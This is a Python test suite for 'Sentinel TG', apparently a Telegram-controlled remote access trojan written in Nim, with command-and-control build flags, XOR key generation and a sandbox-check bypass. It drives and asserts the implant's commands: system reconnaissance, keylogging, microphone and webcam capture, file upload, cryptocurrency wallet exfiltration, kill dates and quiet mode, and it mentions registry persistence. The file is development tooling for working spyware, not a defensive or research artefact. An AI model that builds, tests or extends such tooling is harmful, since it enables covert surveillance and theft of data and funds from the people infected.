#!/usr/bin/env python3
"""Automated command-handler tests for Sentinel TG.

Builds the headless REPL variant of sentinel.nim (-d:sentinel_repl) and
drives every Telegram command handler through stdin, asserting replies.
No Telegram account needed - this exercises the exact handleMessage the
long-poll loop uses.

Run:  python tests/test_tg_commands.py [--build]
"""

import argparse
import pathlib
import re
import subprocess
import sys
import time

ROOT = pathlib.Path(__file__).resolve().parent.parent
NIM = r"D:\appdata\nim-2.2.10\bin\nim.exe"
REPL_EXE = ROOT / "build" / "sentinel_repl.exe"
ENV = {
    "TELEGRAM_BOT_TOKEN": "123456:AAADUMMY",
    "TELEGRAM_CHAT_ID": "0",
    "C2_NO_PERSIST": "1",
    "C2_NO_SANDBOX_CHECK": "1",
    "TEMP": __import__("os").environ.get("TEMP", r"C:\Windows\Temp"),
}

passed = failed = 0


def build():
    import secrets as pysecrets
    key = pysecrets.token_hex(32)
    key_nim = ("const XorKey: array[32, byte] = [byte "
               + ", ".join("0x" + key[i:i+2] for i in range(0, 64, 2)) + "]")
    (ROOT / "xorkey.nim").write_text(key_nim + "\n")
    cmd = [
        NIM, "c", "-d:release", "-d:sentinel_repl", "-d:c2_tg",
        "--app:console", "--path:common", "--threads:on",
        "--out:" + str(REPL_EXE), str(ROOT / "sentinel.nim"),
    ]
    print("[*] building REPL:", " ".join(cmd[1:6]), "…")
    r = subprocess.run(cmd, cwd=ROOT, capture_output=True, text=True)
    (ROOT / "xorkey.nim").unlink(missing_ok=True)
    if r.returncode != 0:
        print(r.stdout[-4000:])
        print(r.stderr[-2000:])
        raise SystemExit("REPL build failed")


class Repl:
    def __init__(self):
        import os
        env = dict(os.environ)          # keep SystemRoot etc. intact
        env.update(ENV)
        self.p = subprocess.Popen(
            [str(REPL_EXE)], cwd=ROOT, env=env,
            stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL, text=True, encoding="utf-8",
            errors="replace", bufsize=1,
        )
        ready = self._readline(time.time() + 20)
        ok = False
        end = time.time() + 20
        while not ok and time.time() < end:
            if ready is None: break
            if "REPL-READY" in ready: ok = True; break
            ready = self._readline(end)
        assert ok, "REPL did not announce readiness"

    def _readline(self, deadline):
        while time.time() < deadline:
            line = self.p.stdout.readline()
            if line is None:
                continue
            if line == "":
                time.sleep(0.02)
                continue
            return line.rstrip("\n")
        return None

    def cmd(self, text, timeout=150):
        """Send one command; return exactly its reply body.

        Resyncs on the ---REPLY--- marker so stray async output can't
        desync the stream between calls."""
        self.p.stdin.write(text + "\n")
        self.p.stdin.flush()
        deadline = time.time() + timeout
        # Phase 1: wait for the reply header.
        while True:
            line = self._readline(deadline)
            if line is None:
                return "[timeout waiting for reply]"
            if "---REPLY---" in line:
                break
        # Phase 2: collect until terminator.
        buf = []
        while time.time() < deadline:
            line = self._readline(deadline)
            if line is None:
                break
            if "---END---" in line:
                break
            buf.append(line)
        while buf and buf[-1] == "":
            buf.pop()
        return "\n".join(buf)

    def close(self):
        try:
            self.p.stdin.write("/quit\n")
            self.p.stdin.flush()
            self.p.wait(timeout=5)
        except Exception:
            self.p.kill()


def check(name, cond, detail=""):
    global passed, failed
    mark = "PASS" if cond else "FAIL"
    print(f"  {mark}  {name}" + (f"   -> {detail[:160]}" if not cond else ""))
    passed, failed = passed + (1 if cond else 0), failed + (0 if cond else 1)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--build", action="store_true")
    args = ap.parse_args()
    if args.build or not REPL_EXE.exists():
        build()

    print("=" * 52)
    print("#  Sentinel TG command-handler test suite")
    print("=" * 52)

    r = Repl()

    # ---- basic recon handlers ----
    out = r.cmd("/sysinfo")
    check("/sysinfo returns JSON with host", '"host"' in out and '"user"' in out, out)

    out = r.cmd("/whoami")
    check("/whoami has @ separator", "@" in out, out)

    out = r.cmd("/pwd")
    check("/pwd non-empty", len(out.strip()) > 1, out)

    out = r.cmd("/ls")
    check("/ls lists entries", ("sentinel.nim" in out) or ("<dir>" in out) or ("(empty)" in out), out)

    out = r.cmd("/ps")
    check("/ps shows processes header", "processes (" in out, out)
    check("/ps shows real names", "svchost.exe" in out.lower(), out)

    out = r.cmd("/env TEMP")
    check("/env resolves var", len(out.strip()) > 0, out)

    out = r.cmd("/drives")
    check("/drives output", len(out.strip()) > 0, out)

    # ---- help ----
    out = r.cmd("/help")
    for needle in ("/keys", "/mic", "/cam", "/killdate", "/wake", "/exfil media"):
        check(f"/help documents {needle}", needle in out, out[:120])

    # ---- unknown ----
    out = r.cmd("/definitely_not_a_command")
    check("unknown command reported", "unknown command" in out, out)

    # ---- killdate lifecycle ----
    out = r.cmd("/killdate off")
    check("/killdate off clears", "cleared" in out, out)

    future = str(int(time.time()) + 3600)
    out = r.cmd("/killdate " + future)
    check("/killdate sets future ts", "kill date set" in out, out)

    out = r.cmd("/status")
    check("/status shows killdate", "killdate:" in out, out)

    past = str(int(time.time()) - 100)
    out = r.cmd("/killdate " + past)
    check("/killdate past rejected", "would die immediately" in out, out)

    out = r.cmd("/killdate off")
    check("/killdate cleared again", "cleared" in out, out)

    # ---- sleep / wake ----
    out = r.cmd("/sleep 3")
    check("/sleep enters quiet mode", "sleeping" in out, out)

    out = r.cmd("/help")
    check("quiet mode gates commands", "[zzz]" in out, out)

    out = r.cmd("/wake")
    check("/wake exits quiet mode", "awake" in out, out)

    out = r.cmd("/wake")
    check("double wake handled", "not sleeping" in out, out)

    # ---- file ops against repo root ----
    out = r.cmd("/cat sentinel.nim")
    check("/cat reads file content", ("proc" in out) or ("import" in out), out[:120])

    out = r.cmd('/upload "' + str(ROOT / ".gitignore") + '"')
    ok_upload = ("uploaded" in out) or ("failed" in out)  # network may be absent
    check("/upload handles real path", ok_upload, out)

    # ---- surveillance (hardware-optional; must not crash) ----
    out = r.cmd("/keys start")
    check("/keys start acks", ("running" in out) or ("already" in out), out)

    out = r.cmd("/keys dump")
    check("/keys dump works", ("no keystrokes yet" in out) or ("[file]" in out) or ("no keystrokes captured" in out), out)

    out = r.cmd("/keys stop")
    check("/keys stop works", True, out)  # any reply is fine; crash would DEFECT

    t0 = time.time()
    out = r.cmd("/mic 1", timeout=60)
    dur = time.time() - t0
    mic_ok = ("[file] mic_" in out and ".wav" in out) or "[!] mic:" in out
    check("/mic 1 completes <45s without defect", mic_ok and dur < 45, f"{dur:.1f}s {out}")

    out = r.cmd("/cam", timeout=90)
    cam_ok = ("[+] cam" in out) or ("[!] cam" in out) or ("[sent-doc]" in out)
    check("/cam completes gracefully", cam_ok and len(out.strip()) > 0, out)

    # ---- exfil kinds (staging only; no upload asserted) ----
    out = r.cmd("/exfil recent", timeout=90)
    check("/exfil recent stages or errors cleanly",
          "{" in out and "error" not in out.split("\n")[0], out[:120])

    out = r.cmd("/exfil wallet", timeout=90)
    check("/exfil wallet runs", "{" in out, out[:120])

    out = r.cmd("/exfil bogus")
    check("/exfil usage on bad kind", "usage:" in out, out)

    # ---- persistence cycle is NOT auto-tested here (touches registry);
    # covered by the manual live walkthrough. ----

    r.close()
    print("=" * 52)
    print(f"  PASSED: {passed}   |   FAILED: {failed}")
    print("=" * 52)
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
